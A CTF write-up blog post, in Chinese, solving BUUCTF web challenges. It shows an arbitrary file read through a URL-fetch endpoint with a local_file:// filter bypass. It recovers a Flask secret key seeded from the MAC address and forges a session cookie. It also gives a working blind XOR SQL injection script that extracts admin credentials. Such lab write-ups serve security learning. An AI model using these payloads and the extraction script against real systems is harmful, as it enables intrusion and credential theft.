---
title: "BUUCTF Web Writeup 9"
date: 2022-11-25T18:35:12+08:00
lastmod: 2022-11-25T18:35:12+08:00
draft: true
author: "X1r0z"

tags: []
categories: []

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录…

<!--more-->

## [CISCN2019 华东南赛区]Web4

任意文件读取

```
http://b49584d3-3080-416f-9e7e-f1390082ab6a.node4.buuoj.cn:81/read?url=/proc/self/cmdline
```

读取 cmdline 之后发现源文件在 /app/app.py 下, 然后读取 /usr/local/bin/python 发现环境是 2.7

```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

一开始往 flask pin 方向想了, 看到 `uuid.getnode()` 才想起来读取的是 mac 地址, 那么就存在伪随机数的问题

```python
import random
import uuid

mac = '1a:fe:f0:5d:cc:05'
n = int(mac.replace(':', ''), 16)
random.seed(n)
print str(random.random() * 233)
```

首先必须得用 python 2.7 来跑, 然后坑点是 str 会对小数点后面几位四舍五入一下, 所以最终的 secret\_key 是 `145.348233579` 而不是 `145.34823357875226`

flask-session-cookie-manager 伪造 cookie 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211251840944.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211251840586.png)

看 wp 学到一个知识点, flask 环境下可以用 `local_file://` 代替 `file://`

## [Black Watch 入群题]Web

前端 webpack 打包, 开发者工具可以看到 vue 源码

简单异或 sql 注入

```python
import requests
import time

flag = ''

i = 1

while True:

    min = 32
    max = 127

    while min < max:
        time.sleep(0.08)
        mid = (min + max) // 2
        print(chr(mid))

        payload = 'if(ascii(substr((select(group_concat(username,\'_\',password))from(admin)),{},1))>{},1,0)'.format(i, mid)
        url = 'http://8f46cc43-6237-42d6-ae95-bee39e010ed1.node4.buuoj.cn:81/backend/content_detail.php?id=1^({})^1'.format(payload)
        res = requests.get(url)
        if 'content' in res.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    i += 1

    print('found', flag)
```

用跑出来的第二个用户登录即可得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211252017842.png)

## [GWCTF 2019]mypassword

